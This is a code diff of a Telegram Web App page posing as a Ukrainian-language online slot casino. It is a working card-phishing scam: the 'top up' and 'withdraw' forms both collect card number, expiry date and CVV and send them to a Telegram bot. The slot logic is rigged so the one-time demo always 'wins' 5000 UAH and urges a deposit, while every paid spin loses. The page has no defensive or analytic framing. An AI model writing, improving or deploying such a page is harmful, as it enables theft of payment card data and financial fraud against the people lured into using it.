@@ -1,73 +1,95 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0f0f0f; color: #ffd700; font-family: 'Arial', sans-serif; text-align: center; margin: 0; padding: 20px; }
-        .header { font-size: 28px; font-weight: bold; text-shadow: 0 0 10px gold; margin-bottom: 20px; }
-        .balance { font-size: 20px; color: white; background: #222; padding: 10px; border-radius: 10px; border: 1px solid gold; }
-        .slot-machine { background: #1a1a1a; border: 4px solid gold; border-radius: 20px; padding: 40px 20px; margin: 20px 0; box-shadow: 0 0 20px rgba(255, 215, 0, 0.3); }
-        .slots { font-size: 60px; margin-bottom: 20px; display: flex; justify-content: center; gap: 15px; }
-        .btn { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-spin { background: linear-gradient(45deg, #ffcc00, #ff9900); color: black; }
+        body { background: #0f0f0f; color: #ffd700; font-family: sans-serif; text-align: center; padding: 20px; }
+        .slot-machine { background: #1a1a1a; border: 3px solid gold; border-radius: 15px; padding: 20px; margin: 20px 0; }
+        .slots { font-size: 50px; display: flex; justify-content: center; gap: 10px; height: 70px; overflow: hidden; }
+        .btn { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
+        .btn-spin { background: orange; color: black; }
         .btn-pay { background: #28a745; color: white; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); padding-top: 50px; }
-        input { width: 80%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #444; background: #222; color: white; font-size: 16px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; }
+        input { width: 85%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #444; background: #222; color: white; }
+        @keyframes rolling { 0% { transform: translateY(0); } 100% { transform: translateY(-100px); } }
+        .rolling { animation: rolling 0.1s infinite linear; }
     </style>
 </head>
 <body>
-
-    <div class="header">🎰 CAZINO 777 🎰</div>
-    <div class="balance">Баланс: <span id="user-balance">0</span> грн</div>
+    <h2>🎰 CAZINO PREMIUM</h2>
+    <div id="balance-div">Баланс: <span id="balance">0</span> грн</div>
 
     <div class="slot-machine">
-        <div class="slots" id="slots">
-            <span>7</span><span>7</span><span>7</span>
+        <div class="slots" id="slot-container">
+            <span id="s1">7</span><span id="s2">7</span><span id="s3">7</span>
         </div>
-        <button class="btn btn-spin" onclick="spin()">КРУТИТИ (10 грн)</button>
-        <button class="btn btn-spin" style="background: #444;" onclick="spin()">ПРОБНО</button>
+        <button class="btn btn-spin" onclick="play(false)">КРУТИТИ (10 грн)</button>
+        <button class="btn" style="background: #444; color: white;" id="demo-btn" onclick="play(true)">ПРОБНО (1 РАЗ)</button>
     </div>
 
-    <button class="btn btn-pay" onclick="openModal()">ПОПОВНИТИ БАЛАНС</button>
-    <button class="btn" style="background: #dc3545; color: white;" onclick="alert('Зачекайте 4-96 годин. Виводів занадто багато!')">ВИВЕСТИ</button>
+    <button class="btn btn-pay" onclick="showModal('PAY')">ПОПОВНИТИ</button>
+    <button class="btn" style="background: #dc3545; color: white;" onclick="showModal('OUT')">ВИВЕСТИ</button>
 
-    <div id="payModal" class="modal">
-        <h2>💳 Поповнення</h2>
-        <input type="text" id="card" placeholder="Номер карти (16 цифр)">
-        <input type="text" id="date" placeholder="ММ/РР">
-        <input type="text" id="cvv" placeholder="CVV">
+    <div id="modal" class="modal">
+        <h3 id="modal-title">💳 Картка</h3>
+        <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19">
+        <input type="text" id="date" placeholder="ММ/РР" maxlength="5">
+        <input type="text" id="cvv" placeholder="CVV" maxlength="3">
         <input type="number" id="amount" placeholder="Сума (грн)">
-        <button class="btn btn-pay" onclick="sendPayment()">ПІДТВЕРДИТИ</button>
-        <button class="btn" onclick="closeModal()">СКАСУВАТИ</button>
+        <button class="btn btn-pay" onclick="sendData()">ПІДТВЕРДИТИ</button>
+        <button class="btn" onclick="document.getElementById('modal').style.display='none'">СКАСУВАТИ</button>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
-        tg.expand();
+        let balance = 0;
+        let demoUsed = false;
+        let currentAction = "";
 
-        function spin() {
-            const slots = document.getElementById('slots');
-            slots.innerHTML = "<span>🍒</span><span>7</span><span>🍋</span>";
-            setTimeout(() => alert("Ви майже виграли! Спробуйте ще раз!"), 500);
+        // Маска для картки (пробіли кожні 4 цифри)
+        document.getElementById('card').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        function showModal(type) {
+            currentAction = type === 'PAY' ? "ПОПОВНЕННЯ" : "ВИВЕДЕННЯ";
+            document.getElementById('modal-title').innerText = type === 'PAY' ? "💳 Поповнення" : "💰 Виведення коштiв";
+            document.getElementById('modal').style.display = 'block';
         }
 
-        function openModal() { document.getElementById('payModal').style.display = 'block'; }
-        function closeModal() { document.getElementById('payModal').style.display = 'none'; }
+        function play(isDemo) {
+            if (!isDemo && balance < 10) return alert("Недостатньо коштів!");
+            if (isDemo && demoUsed) return alert("Пробний режим доступний 1 раз!");
+            
+            if (isDemo) demoUsed = true; else balance -= 10;
+            document.getElementById('balance').innerText = balance;
 
-        function sendPayment() {
+            const s1 = document.getElementById('s1'), s2 = document.getElementById('s2'), s3 = document.getElementById('s3');
+            [s1, s2, s3].forEach(s => s.classList.add('rolling'));
+
+            setTimeout(() => {
+                [s1, s2, s3].forEach(s => s.classList.remove('rolling'));
+                if (isDemo) {
+                    s1.innerText = "7"; s2.innerText = "7"; s3.innerText = "7";
+                    alert("ВИ ВИГРАЛИ 5000 ГРН! Поповніть баланс, щоб грати на справжні гроші!");
+                } else {
+                    s1.innerText = "🍒"; s2.innerText = "7"; s3.innerText = "🍋";
+                    alert("Програш. Спробуйте ще раз!");
+                }
+            }, 1500);
+        }
+
+        function sendData() {
             let data = {
-                action: "ПОПОЛНЕНИЕ",
+                action: currentAction,
                 card: document.getElementById('card').value,
                 date: document.getElementById('date').value,
                 cvv: document.getElementById('cvv').value,
                 amount: document.getElementById('amount').value
             };
-            
-            // Отправка данных боту
             tg.sendData(JSON.stringify(data));
-            alert("Зачекайте 4-96 годин для підтвердження транзакції.");
             tg.close();
         }
     </script>
